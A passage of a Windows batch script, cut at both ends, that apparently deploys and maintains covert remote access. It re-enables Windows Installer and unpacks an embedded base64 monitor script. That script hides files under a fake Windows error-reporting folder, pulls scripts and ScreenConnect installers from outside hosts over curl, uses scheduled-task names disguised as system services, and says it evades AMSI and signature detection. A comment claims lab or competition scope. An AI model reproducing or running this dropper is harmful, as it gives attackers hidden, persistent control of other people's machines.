if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
::QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIwMjYwODA0TTQ1DQpy
::ZW0gIE00NTogTDQyIHNhZmUgRlAgbWlncmF0ZSAoaW5zdGFsbCBuZXcgYmVmb3Jl
::IHJlbW92aW5nIG9sZCBHcnl4YSkuDQpyZW0gIE00NDogZm9yY2VfZ3J5eGEuZmxh
::ZyBtdXN0IE5PVCAveCBsaXZlIEdyeXhhIChMNDEgZm9yY2Utc2tpcC1pZi1ydW5u
::aW5nKS4NCnJlbSAgTTQzOiBBTVNJLXByb29mIEdyeXhhIGZhbGxiYWNrIHZpYSBv
::d25fZ3J5eGEuY21kIChwdXJlIG1zaWV4ZWMpIHdoZW4gUFMgYmxvY2tlZC9taXNz
::aW5nLg0KcmVtICBNNDI6IHNpZ25lZCBtYW5pZmVzdDsgc2V2cnouY2ZnOyBzaWJs
::aW5nLXNhZmUgc2V2cnogL2kuDQpyZW0gIEF1dGhvcml6ZWQgaW50ZXJuYWwgZGVw
::bG95bWVudCAtIGxhYi9jb21wZXRpdGlvbiBzY29wZSBvbmx5Lg0KcmVtIOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkA0Kc2V0bG9j
::YWwgRW5hYmxlRGVsYXllZEV4cGFuc2lvbg0KDQpzZXQgIktFRVBfRlA9NWY2MDEw
::NTc5ODUyZTUwNyINCnNldCAiQUxUX0ZQPWY4NjFjODE0MGQ0NTM0MjciDQpzZXQg
::IkdSWVhBX0ZQPTM2ZTUwNmZmMDE2YjIxNTEiDQpzZXQgIldEPUM6XFByb2dyYW1E
::YXRhXE1pY3Jvc29mdFxXaW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0Kc2V0ICJF
::VEw9QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRs
::Y2FjaGUiDQpzZXQgIkxPRz0lV0QlXG93bl9tb24ubG9nIg0Kc2V0ICJTVEFURT0l
::V0QlXG93bl9tb24uc3RhdGUiDQpzZXQgIkhCRkxBRz0lV0QlXGhiLmZsYWciDQpz
::ZXQgIkNVUkw9JVN5c3RlbVJvb3QlXFN5c3RlbTMyXGN1cmwuZXhlIg0Kc2V0ICJU
::Rz1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0
::aHViLWRyb3AvbWFpbi90Z19yZXBvcnQucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSIN
::CnNldCAiVEcyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9n
::aXRodWItZHJvcEBtYWluL3RnX3JlcG9ydC5wczE/dD0lUkFORE9NJSVSQU5ET00l
::Ig0Kc2V0ICJPV05TRUM9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t
::L3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX3NlY3VyZS5jbWQ/dD0lUkFO
::RE9NJSVSQU5ET00lIg0Kc2V0ICJPV05TRUMyPWh0dHBzOi8vY2RuLmpzZGVsaXZy
::Lm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9zZWN1cmUuY21k
::P3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOTU9OPWh0dHBzOi8vcmF3Lmdp
::dGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293
::bl9tb24uY21kP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOTU9OMj1odHRw
::czovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFp
::bi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTkxJQj1o
::dHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHVi
::LWRyb3AvbWFpbi9vd25fbGliLnBzMT90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQg
::Ik9XTkxJQjI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dp
::dGh1Yi1kcm9wQG1haW4vb3duX2xpYi5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0K
::c2V0ICJPV05HUllYQT1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20v
::eG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25fZ3J5eGEuY21kP3Q9JVJBTkRP
::TSUlUkFORE9NJSINCnNldCAiT1dOR1JZWEEyPWh0dHBzOi8vY2RuLmpzZGVsaXZy
::Lm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9ncnl4YS5jbWQ/
::dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJNQU5JRkVTVF9VUkw9aHR0cHM6Ly9y
::YXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21h
::aW4vdXBkYXRlLm1hbmlmZXN0P3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiTUFO
::SUZFU1RfU0lHX1VSTD1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20v
::eG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi91cGRhdGUubWFuaWZlc3Quc2lnP3Q9
::JVJBTkRPTSUlUkFORE9NJSINCnNldCAiU0VWUlpfRVhQX1VSTD1odHRwczovL3Jh
::dy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFp
::bi9zZXZyel9leHBlY3RlZC5jZmc/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJT
::RVZSWl9FWFBfVVJMMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVk
::ZHkvZ2l0aHViLWRyb3BAbWFpbi9zZXZyel9leHBlY3RlZC5jZmc/dD0lUkFORE9N
::JSVSQU5ET00lIg0Kc2V0ICJNU0lfVVJMPWh0dHBzOi8vdWkuc2V2cnouY29tL0Jp
::bi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0
::Ig0Kc2V0ICJNU0lfR1JZWEE9aHR0cHM6Ly91aS5ncnl4YS5jb20vQmluL1NjcmVl
::bkNvbm5lY3QuQ2xpZW50U2V0dXAubXNpP2U9QWNjZXNzJnk9R3Vlc3QiDQpzZXQg
::Ik1TSV9QS0cxPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9i
::dWRkeS9naXRodWItZHJvcC9tYWluL3BrZy5tc2kiDQpzZXQgIk1TSV9QS0cyPWh0
::dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBt
::YWluL3BrZy5tc2kiDQpzZXQgIk1TST0lUHJvZ3JhbURhdGElXFNjcmVlbkNvbm5l
::Y3QuQ2xpZW50U2V0dXAubXNpIg0Kc2V0ICJNU0lDQUNIRT0lV0QlXHBrZy5tc2ki
::DQpzZXQgIk1TSV9HPSVQcm9ncmFtRGF0YSVcU2NyZWVuQ29ubmVjdC5Hcnl4YS5t
::c2kiDQpzZXQgIk1TSUNBQ0hFX0c9JVdEJVxwa2dfZ3J5eGEubXNpIg0KDQppZiBu
::b3QgZXhpc3QgIiVXRCUiIG1kICIlV0QlIiAyPm51bA0KaWYgbm90IGV4aXN0ICIl
::TE9HJSIgdHlwZSBudWw+IiVMT0clIiAyPm51bA0KDQpzZXQgIk1PTlZFUj1NNDUi
::DQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiR1JZWEFfREVF
::UD0lV0QlXGdyeXhhX2RlZXAuZmxhZyINCnJlbSBsb2FkIGN1cnJlbnQgR3J5eGEg
::RlAgKG1heSByb3RhdGUgd2hlbiBzZXJ2ZXIva2V5cyBjaGFuZ2UpDQppZiBleGlz
::dCAiJVdEJVxncnl4YS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBk
::ZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4YS5jZmciKSBkbyBpZiAvSSAiJSVL
::Ij09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVMIg0KaWYgbm90IGRlZmlu
::ZWQgR1JZWEFfRlAgc2V0ICJHUllYQV9GUD0zNmU1MDZmZjAxNmIyMTUxIg0KZm9y
::IC9mICJ0b2tlbnM9MS0zIGRlbGltcz0vICIgJSVhIGluICgiJWRhdGUlIikgZG8g
::c2V0ICJEVD0lZGF0ZSUgJXRpbWUlIg0KZWNoby4+PiIlTE9HJSINCmVjaG8g4pSA
::4pSAIHRpY2sgIURUISBbdmVyICVNT05WRVIlXSDilIDilIA+PiIlTE9HJSINCnNl
::dCAiQ09VTlQ9MCINCnNldCAiSU5TVEFMTEVEPTAiDQpzZXQgIlBSSU1fT0s9MCIN
::CnNldCAiQUxUX09LPTAiDQpzZXQgIkZPUkVJR05fTEVGVD0wIg0Kc2V0ICJGT1JF
::SUdOX0xJU1Q9Ig0Kc2V0ICJNU0lFWElUPW5vdC1ydW4iDQoNCnJlbSDilIDilIAg
::WzBdIHNpbmdsZS1mbGlnaHQgbXV0ZXggKHN0b3Agb3ZlcmxhcHBpbmcgdGlja3Mg
::cmFjaW5nIG1zaWV4ZWMpIOKUgOKUgA0Kc2V0ICJNVVRFWD0lV0QlXHRpY2subG9j
::ayINCmlmIGV4aXN0ICIlTVVURVglIiAoDQogIGZvciAlJUEgaW4gKCIlTVVURVgl
::IikgZG8gc2V0ICJMT0NLQUdFPSUlfnRBIg0KICBwb3dlcnNoZWxsIC1Ob1Byb2Zp
::bGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoVGVzdC1QYXRoICclTVVU
::RVglJykgLWFuZCAoKChHZXQtRGF0ZSktKEdldC1JdGVtIC1MaXRlcmFsUGF0aCAn
::JU1VVEVYJScgLUZvcmNlKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0ZXMgLWx0
::IDIwKSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYxDQogIGlm
::IGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyB0aWNrX3NraXBwZWRfbXV0ZXhfYnVz
::eT4+IiVMT0clIg0KICAgIGVuZGxvY2FsDQogICAgZXhpdCAvYiAwDQogICkNCikN
::CmVjaG8gJURBVEUlICVUSU1FJSAlUkFORE9NJT4iJU1VVEVYJSINCg0KcmVtIOKU
::gOKUgCBwZXItaG9zdCBpZGVudGl0eSAoYW50aS1zaWduYXR1cmUpIOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBv
::d2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
::bGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gaW5p
::dCAtV29ya0RpciAiJVdEJSIgPm51bCAyPiYxDQppZiBleGlzdCAiJVdEJVxpZGVu
::dGl0eS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIg
::JSVLIGluICgiJVdEJVxpZGVudGl0eS5jZmciKSBkbyBzZXQgIiUlSz0lJUwiDQpp
::ZiBub3QgZGVmaW5lZCBUQVNLX0Egc2V0ICJUQVNLX0E9V2VyUXVldWVTeW5jIg0K
::aWYgbm90IGRlZmluZWQgVEFTS19CIHNldCAiVEFTS19CPVBsYVNlcnZlckhlYWx0
::aCINCmlmIG5vdCBkZWZpbmVkIFRBU0tfQyBzZXQgIlRBU0tfQz1XZGlIb3N0UHJv
::eHkiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Qgc2V0ICJUQVNLX0Q9VGNwSXBDb25m
::bGljdFJlcyINCmlmIG5vdCBkZWZpbmVkIE1PX0Egc2V0ICJNT19BPTIiDQppZiBu
::b3QgZGVmaW5lZCBNT19CIHNldCAiTU9fQj0zIg0KDQpyZW0g4pSA4pSAIFtBXSBh
::dXRvLXVwZGF0ZSBjb3JlIGZpbGVzIChiZXN0IGVmZm9ydCkg4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiBu
::b3QgZXhpc3QgIiVDVVJMJSIgc2V0ICJDVVJMPWN1cmwuZXhlIg0KcmVtIE0zNTog
::Z3VhcmFudGVlIHVwZGF0ZSBjaGFubmVsIOKAlCB1bmhhcmRlbiB3b3JrZGlyIGVh
::Y2ggdGljayBhbmQgc3RhZ2UgZG93bmxvYWRzDQpyZW0gaW4gQzpcV2luZG93c1xU
::ZW1wIChuZXZlciBBQ0wtbG9ja2VkKSwgdGhlbiBtb3ZlIGludG8gJVdEJS4gTG9j
::a0RpciBjYW5ub3QgZnJlZXplIHVzLg0Kc2V0ICJTVEFHRT0lU3lzdGVtUm9vdCVc
::VGVtcFwudXBkIg0KaWYgbm90IGV4aXN0ICIlU1RBR0UlIiBta2RpciAiJVNUQUdF
::JSIgPm51bCAyPiYxDQphdHRyaWIgLWggLXMgLXIgIiVXRCUiID5udWwgMj4mMQ0K
::dGFrZW93biAvRiAiJVdEJSIgL1IgL0QgWSA+bnVsIDI+JjENCmljYWNscyAiJVdE
::JSIgL3Jlc2V0IC9UIC9DIC9RID5udWwgMj4mMQ0KaWNhY2xzICIlV0QlIiAvZ3Jh
::bnQgIk5UIEFVVEhPUklUWVxTWVNURU06KE9JKShDSSlGIiAiQlVJTFRJTlxBZG1p
::bmlzdHJhdG9yczooT0kpKENJKUYiIC9UIC9DIC9RID5udWwgMj4mMQ0KYXR0cmli
::IC1oIC1zIC1yICIlV0QlXHRnX3JlcG9ydC5wczEiICIlV0QlXG93bl9zZWN1cmUu
::Y21kIiAiJVdEJVxvd25fbGliLnBzMSIgIiVXRCVcb3duX21vbi5jbWQiID5udWwg
::Mj4mMQ0KDQpzZXQgIlNFTEZfVVBEPTAiDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1y
::ZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlU1RB
::R0UlXHRnX3JlcG9ydC5uZXciICIlVEclIiA+bnVsIDI+JjENCmlmIG5vdCBleGlz
::dCAiJVNUQUdFJVx0Z19yZXBvcnQubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3Qt
::dGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVTVEFHRSVcdGdfcmVwb3J0Lm5l
::dyIgIiVURzIlIiA+bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9r
::ZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMzAgLW8gIiVTVEFHRSVc
::b3duX3NlY3VyZS5uZXciICIlT1dOU0VDJSIgPm51bCAyPiYxDQppZiBub3QgZXhp
::c3QgIiVTVEFHRSVcb3duX3NlY3VyZS5uZXciICIlQ1VSTCUiIC1MIC0tY29ubmVj
::dC10aW1lb3V0IDggLS1tYXgtdGltZSAzMCAtbyAiJVNUQUdFJVxvd25fc2VjdXJl
::Lm5ldyIgIiVPV05TRUMyJSIgPm51bCAyPiYxDQoiJUNVUkwlIiAtTCAtLXNzbC1u
::by1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIl
::U1RBR0UlXG93bl9saWIubmV3IiAiJU9XTkxJQiUiID5udWwgMj4mMQ0KaWYgbm90
::IGV4aXN0ICIlU1RBR0UlXG93bl9saWIubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5l
::Y3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVTVEFHRSVcb3duX2xpYi5u
::ZXciICIlT1dOTElCMiUiID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8t
::cmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVNU
::QUdFJVxvd25fbW9uLm5leHQiICIlT1dOTU9OJSIgPm51bCAyPiYxDQppZiBub3Qg
::ZXhpc3QgIiVTVEFHRSVcb3duX21vbi5uZXh0IiAiJUNVUkwlIiAtTCAtLWNvbm5l
::Y3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVTVEFHRSVcb3duX21vbi5u
::ZXh0IiAiJU9XTk1PTjIlIiA+bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0tc3NsLW5v
::LXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMjAgLW8gIiVT
::VEFHRSVcb3duX2dyeXhhLm5ldyIgIiVPV05HUllYQSUiID5udWwgMj4mMQ0KaWYg
::bm90IGV4aXN0ICIlU1RBR0UlXG93bl9ncnl4YS5uZXciICIlQ1VSTCUiIC1MIC0t
::Y29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSAyMCAtbyAiJVNUQUdFJVxvd25f
::Z3J5eGEubmV3IiAiJU9XTkdSWVhBMiUiID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwg
::LS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDYgLS1tYXgtdGltZSAy
::MCAtbyAiJVNUQUdFJVx1cGRhdGUubWFuaWZlc3QiICIlTUFOSUZFU1RfVVJMJSIg
::Pm51bCAyPiYxDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0
::LXRpbWVvdXQgNiAtLW1heC10aW1lIDIwIC1vICIlU1RBR0UlXHVwZGF0ZS5tYW5p
::ZmVzdC5zaWciICIlTUFOSUZFU1RfU0lHX1VSTCUiID5udWwgMj4mMQ0KDQpyZW0g
::TTQyOiBzaWduZWQgdXBkYXRlLm1hbmlmZXN0IGdhdGUgKFJTQS1TSEEyNTYpLiBG
::YWxsYmFjayB0byBCVUlMRCBtYXJrZXJzIGlmIG5vIHB1YmtleSB5ZXQuDQpzZXQg
::IlVQRF9PSz0wIg0Kc2V0ICJNQVA9Ig0KaWYgZXhpc3QgIiVTVEFHRSVcb3duX2xp
::Yi5uZXciIHNldCAiTUFQPSFNQVAhb3duX2xpYi5wczE9JVNUQUdFJVxvd25fbGli
::Lm5ldzsiDQppZiBleGlzdCAiJVNUQUdFJVxvd25fbW9uLm5leHQiIHNldCAiTUFQ
::PSFNQVAhb3duX21vbi5jbWQ9JVNUQUdFJVxvd25fbW9uLm5leHQ7Ig0KaWYgZXhp
::c3QgIiVTVEFHRSVcb3duX3NlY3VyZS5uZXciIHNldCAiTUFQPSFNQVAhb3duX3Nl
::Y3VyZS5jbWQ9JVNUQUdFJVxvd25fc2VjdXJlLm5ldzsiDQppZiBleGlzdCAiJVNU
::QUdFJVx0Z19yZXBvcnQubmV3IiBzZXQgIk1BUD0hTUFQIXRnX3JlcG9ydC5wczE9
::JVNUQUdFJVx0Z19yZXBvcnQubmV3OyINCmlmIGV4aXN0ICIlU1RBR0UlXG93bl9n
::cnl4YS5uZXciIHNldCAiTUFQPSFNQVAhb3duX2dyeXhhLmNtZD0lU1RBR0UlXG93
::bl9ncnl4YS5uZXc7Ig0Kc2V0ICJWUkVTPW1pc3NpbmciDQppZiBleGlzdCAiJVdE
::JVxvd25fbGliLnBzMSIgaWYgZXhpc3QgIiVTVEFHRSVcdXBkYXRlLm1hbmlmZXN0
::IiBpZiBleGlzdCAiJVNUQUdFJVx1cGRhdGUubWFuaWZlc3Quc2lnIiBpZiBkZWZp
::bmVkIE1BUCAoDQogIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChg
::cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9u
::UG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiB2
::ZXJpZnktdXBkYXRlIC1Xb3JrRGlyICIlV0QlIiAtRXh0cmEgIiVTVEFHRSVcdXBk
::YXRlLm1hbmlmZXN0fCVTVEFHRSVcdXBkYXRlLm1hbmlmZXN0LnNpZ3whTUFQISJg
::KSBkbyBzZXQgIlZSRVM9JSVSIg0KKQ0KZWNobyB1cGRhdGVfdmVyaWZ5PSFWUkVT
::IT4+IiVMT0clIg0KaWYgL0kgIiFWUkVTISI9PSJvayIgKA0KICBzZXQgIlVQRF9P
::Sz0xIg0KKSBlbHNlIGlmIC9JICIhVlJFUyEiPT0ibWlzc2luZyIgKA0KICBzZXQg
::IlVQRF9PSz1mYWxsYmFjayINCikgZWxzZSBpZiAvSSAiIVZSRVMhIj09Im5vLXB1
::YmtleSIgKA0KICBzZXQgIlVQRF9PSz1mYWxsYmFjayINCikgZWxzZSBpZiAvSSAi
::IVZSRVM6fjAsMTAhIj09Im5vdC1pbi1tYW4iICgNCiAgc2V0ICJVUERfT0s9ZmFs
::bGJhY2siDQopIGVsc2UgKA0KICBlY2hvIHVwZGF0ZV9yZWZ1c2VkXyFWUkVTIT4+
::IiVMT0clIg0KKQ0KDQppZiAvSSAiIVVQRF9PSyEiPT0iMSIgKA0KICBpZiBleGlz
::dCAiJVNUQUdFJVx0Z19yZXBvcnQubmV3IiBtb3ZlIC95ICIlU1RBR0UlXHRnX3Jl
::cG9ydC5uZXciICIlV0QlXHRnX3JlcG9ydC5wczEiID5udWwgMj4mMQ0KICBpZiBl
::eGlzdCAiJVNUQUdFJVxvd25fc2VjdXJlLm5ldyIgbW92ZSAveSAiJVNUQUdFJVxv
::d25fc2VjdXJlLm5ldyIgIiVXRCVcb3duX3NlY3VyZS5jbWQiID5udWwgMj4mMQ0K
::ICBpZiBleGlzdCAiJVNUQUdFJVxvd25fbGliLm5ldyIgbW92ZSAveSAiJVNUQUdF
::JVxvd25fbGliLm5ldyIgIiVXRCVcb3duX2xpYi5wczEiID5udWwgMj4mMQ0KICBp
::ZiBleGlzdCAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiBmaW5kc3RyIC9DOiJPV05f
::R1JZWEEgQlVJTEQiICIlU1RBR0UlXG93bl9ncnl4YS5uZXciID5udWwgMj4mMSAm
::JiBtb3ZlIC95ICIlU1RBR0UlXG93bl9ncnl4YS5uZXciICIlV0QlXG93bl9ncnl4
::YS5jbWQiID5udWwgMj4mMQ0KICBzZXQgIlNFTEZfVVBEPTAiDQogIGlmIGV4aXN0
::ICIlU1RBR0UlXG93bl9tb24ubmV4dCIgKA0KICAgIGZjIC9iICIlU1RBR0UlXG93
::bl9tb24ubmV4dCIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQ0KICAgIGlm
::IGVycm9ybGV2ZWwgMSBzZXQgIlNFTEZfVVBEPTEiDQogICAgaWYgIiFTRUxGX1VQ
::RCEiPT0iMCIgZGVsIC9mIC9xICIlU1RBR0UlXG93bl9tb24ubmV4dCIgPm51bCAy
::PiYxDQogICkNCikgZWxzZSBpZiAvSSAiIVVQRF9PSyEiPT0iZmFsbGJhY2siICgN
::CiAgZmluZHN0ciAvQzoiVEdfUkVQT1JUIEJVSUxEIiAiJVNUQUdFJVx0Z19yZXBv
::cnQubmV3IiA+bnVsIDI+JjEgJiYgZm9yICUlRiBpbiAoIiVTVEFHRSVcdGdfcmVw
::b3J0Lm5ldyIpIGRvIGlmICUlfnpGIEdUUiAxNTAwIG1vdmUgL3kgIiVTVEFHRSVc
::dGdfcmVwb3J0Lm5ldyIgIiVXRCVcdGdfcmVwb3J0LnBzMSIgPm51bCAyPiYxDQog
::IGZpbmRzdHIgL0M6Ik9XTl9TRUNVUkUgQlVJTEQiICIlU1RBR0UlXG93bl9zZWN1
::cmUubmV3IiA+bnVsIDI+JjEgJiYgZm9yICUlRiBpbiAoIiVTVEFHRSVcb3duX3Nl
::Y3VyZS5uZXciKSBkbyBpZiAlJX56RiBHVFIgODAwIG1vdmUgL3kgIiVTVEFHRSVc
::b3duX3NlY3VyZS5uZXciICIlV0QlXG93bl9zZWN1cmUuY21kIiA+bnVsIDI+JjEN
::CiAgZmluZHN0ciAvQzoiT1dOX0xJQiAgQlVJTEQiICIlU1RBR0UlXG93bl9saWIu
::bmV3IiA+bnVsIDI+JjEgJiYgZm9yICUlRiBpbiAoIiVTVEFHRSVcb3duX2xpYi5u
::ZXciKSBkbyBpZiAlJX56RiBHVFIgMTUwMCBtb3ZlIC95ICIlU1RBR0UlXG93bl9s
::aWIubmV3IiAiJVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYxDQogIGZpbmRzdHIg
::L0M6Ik9XTl9HUllYQSBCVUlMRCIgIiVTVEFHRSVcb3duX2dyeXhhLm5ldyIgPm51
::bCAyPiYxICYmIGZvciAlJUYgaW4gKCIlU1RBR0UlXG93bl9ncnl4YS5uZXciKSBk
::byBpZiAlJX56RiBHVFIgNTAwIG1vdmUgL3kgIiVTVEFHRSVcb3duX2dyeXhhLm5l
::dyIgIiVXRCVcb3duX2dyeXhhLmNtZCIgPm51bCAyPiYxDQogIHNldCAiU0VMRl9V
::UEQ9MCINCiAgZmluZHN0ciAvQzoiT1dOX01PTiAgQlVJTEQiICIlU1RBR0UlXG93
::bl9tb24ubmV4dCIgPm51bCAyPiYxDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgZm9y
::ICUlRiBpbiAoIiVTVEFHRSVcb3duX21vbi5uZXh0IikgZG8gaWYgJSV+ekYgR1RS
::IDE1MDAgKA0KICAgIGZjIC9iICIlU1RBR0UlXG93bl9tb24ubmV4dCIgIiVXRCVc
::b3duX21vbi5jbWQiID5udWwgMj4mMQ0KICAgIGlmIGVycm9ybGV2ZWwgMSBzZXQg
::IlNFTEZfVVBEPTEiDQogICkNCiAgaWYgIiVTRUxGX1VQRCUiPT0iMCIgZGVsIC9m
::IC9xICIlU1RBR0UlXG93bl9tb24ubmV4dCIgPm51bCAyPiYxDQopIGVsc2UgKA0K
::ICBkZWwgL2YgL3EgIiVTVEFHRSVcdGdfcmVwb3J0Lm5ldyIgIiVTVEFHRSVcb3du
::X3NlY3VyZS5uZXciICIlU1RBR0UlXG93bl9saWIubmV3IiAiJVNUQUdFJVxvd25f
::bW9uLm5leHQiICIlU1RBR0UlXG93bl9ncnl4YS5uZXciID5udWwgMj4mMQ0KICBz
::ZXQgIlNFTEZfVVBEPTAiDQopDQpkZWwgL2YgL3EgIiVTVEFHRSVcdGdfcmVwb3J0
::Lm5ldyIgIiVTVEFHRSVcb3duX3NlY3VyZS5uZXciICIlU1RBR0UlXG93bl9saWIu
::bmV3IiAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiA+bnVsIDI+JjENCmRlbCAvZiAv
